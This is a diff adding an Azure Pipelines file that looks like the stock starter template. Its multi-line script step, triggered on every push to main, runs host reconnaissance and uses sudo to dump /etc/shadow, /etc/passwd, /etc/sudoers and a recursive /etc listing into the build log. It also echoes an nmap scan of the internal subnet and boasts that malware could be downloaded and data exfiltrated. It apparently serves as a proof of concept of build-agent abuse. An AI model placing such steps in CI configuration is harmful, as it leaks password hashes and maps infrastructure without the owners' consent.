@@ -1,0 +1,48 @@
+# Starter pipeline
+# Start with a minimal pipeline that you can customize to build and deploy your code.
+# Add steps that build, run tests, deploy, and more:
+# https://aka.ms/yaml
+
+trigger:
+- main
+
+pool:
+  vmImage: ubuntu-latest
+
+steps:
+- script: echo Hello, world!
+  displayName: 'Run a one-line script'
+
+- script: |
+    echo Add other tasks to build, test, and deploy your project.
+    echo See https://aka.ms/yaml
+    echo who
+    who
+    echo w
+    w 
+    echo pwd
+    pwd
+    echo ls -la
+    ls -la
+    echo uname -a 
+    uname -a
+    echo ifconfig -a
+    ifconfig -a 
+    echo sudo apt install -y nmap
+    echo nmap -A -Pn -T4 10.1.0.0/24
+    echo cat /etc/passwd
+    sudo cat /etc/passwd
+    echo; echo cat /etc/shadow
+    sudo cat /etc/shadow
+    echo; echo cat /etc/group
+    sudo cat /etc/group
+    echo;echo cat /etc/resolv.conf
+    sudo cat /etc/resolv.conf
+    echo;echo cat /etc/sudoers
+    sudo cat /etc/sudoers
+    echo
+    sudo ls -laR /etc 
+    echo I can download malware here
+    echo I can execute malware here
+    echo I can exfil data here
+  displayName: 'Run a multi-line script'
